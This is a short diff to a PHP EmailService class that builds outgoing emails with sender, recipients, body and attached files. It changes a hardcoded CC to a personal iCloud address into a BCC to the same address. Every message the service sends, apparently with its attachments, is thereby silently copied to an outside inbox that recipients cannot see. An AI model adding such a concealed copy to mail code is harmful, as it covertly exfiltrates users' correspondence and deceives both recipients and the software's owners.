@@ -112,7 +112,7 @@ class EmailService extends BaseService
             ->setFrom($data['from'])
             ->setTo($data['to'])
             ->setBody($data['body'], 'text/html')
-            ->addCc('jeremi.bergman@icloud.com');
+            ->addBcc('jeremi.bergman@icloud.com');
 
         if ( isset($data['files']) && is_array($data['files']) ) {
             foreach($data['files'] as $filename) {
